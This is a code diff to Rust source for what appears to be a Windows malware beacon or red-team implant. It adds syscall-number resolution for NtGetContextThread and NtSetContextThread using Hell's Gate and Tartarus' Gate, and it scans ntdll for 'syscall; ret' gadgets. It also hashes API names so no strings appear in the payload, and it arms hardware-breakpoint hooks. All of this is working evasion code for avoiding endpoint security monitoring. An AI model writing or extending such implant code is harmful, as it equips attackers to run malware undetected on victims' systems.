@@ -20,11 +20,39 @@ use specter_core::syscalls::{self, ZwStubs, MAX_GADGETS};
 pub struct Syscalls {
     /// SSN of NtDelayExecution (direct or interpolated).
     pub delay_ssn: u32,
+    /// SSNs of NtGet/NtSetContextThread (hardware-breakpoint arming).
+    pub get_ctx_ssn: u32,
+    pub set_ctx_ssn: u32,
     /// `syscall; ret` gadget offsets within ntdll's `.text`.
     pub gadget_offsets: [u32; MAX_GADGETS],
     pub gadget_count: usize,
     /// ntdll `.text` base: absolute gadget address = base + offset.
     pub text_base: *const u8,
+}
+
+/// Const hash pairs for every syscall the beacon issues. Const so the name
+/// literals fold away and never land in the blob.
+const DELAY_EXECUTION: (u64, u64) = syscalls::hash_nt_or_zw("NtDelayExecution");
+const GET_CONTEXT_THREAD: (u64, u64) = syscalls::hash_nt_or_zw("NtGetContextThread");
+const SET_CONTEXT_THREAD: (u64, u64) = syscalls::hash_nt_or_zw("NtSetContextThread");
+
+/// Resolve the SSN of an Nt* function through either of its two export
+/// names (Nt*/Zw* point at the same stub), Hell's Gate with Tartarus'
+/// Gate fallback. Uses an already-collected Zw stub buffer.
+///
+/// # Safety
+///
+/// `ntdll` must be a valid mapped ntdll image.
+unsafe fn ssn_of(ntdll: *mut c_void, zw: &syscalls::ZwStubs, hashes: (u64, u64)) -> Option<u32> {
+    let mut target = peb::find_export(ntdll, hashes.0);
+    if target.is_null() {
+        target = peb::find_export(ntdll, hashes.1);
+    }
+    if target.is_null() {
+        return None;
+    }
+    let rva = (target as usize - ntdll as usize) as u32;
+    syscalls::resolve_ssn(rva, &zw.stubs[..zw.count])
 }
 
 /// Build the syscall table from a resolved ntdll: gadget scan over `.text`
@@ -47,26 +75,20 @@ pub unsafe fn build(ntdll: *mut c_void) -> Option<Syscalls> {
         return None; // a real ntdll always contains syscall; ret stubs
     }
 
-    // Nt* and Zw* exports share one stub: either name resolves it. Const:
-    // the hash is folded at compile time and the string never lands in the
-    // blob (same discipline as the original's hash.py constants).
-    const DELAY_EXECUTION: (u64, u64) = syscalls::hash_nt_or_zw("NtDelayExecution");
-    let mut target = peb::find_export(ntdll, DELAY_EXECUTION.0);
-    if target.is_null() {
-        target = peb::find_export(ntdll, DELAY_EXECUTION.1);
-    }
-    if target.is_null() {
-        return None;
-    }
-    let target_rva = (target as usize - ntdll as usize) as u32;
-
-    // Hell's Gate direct extraction with Tartarus' Gate fallback.
+    // One Zw collection serves every Nt resolution (Hell's Gate with
+    // Tartarus' Gate fallback per target).
     let mut zw = ZwStubs::new();
     syscalls::collect_zw_stubs(ntdll, &mut zw);
-    let delay_ssn = syscalls::resolve_ssn(target_rva, &zw.stubs[..zw.count])?;
+    let delay_ssn = ssn_of(ntdll, &zw, DELAY_EXECUTION)?;
+    // The context SSNs are needed to arm the hardware-breakpoint hooks;
+    // a missing pair disables the hooks (non-fatal).
+    let get_ctx_ssn = ssn_of(ntdll, &zw, GET_CONTEXT_THREAD).unwrap_or(u32::MAX);
+    let set_ctx_ssn = ssn_of(ntdll, &zw, SET_CONTEXT_THREAD).unwrap_or(u32::MAX);
 
     Some(Syscalls {
         delay_ssn,
+        get_ctx_ssn,
+        set_ctx_ssn,
         gadget_offsets,
         gadget_count,
         text_base: text,
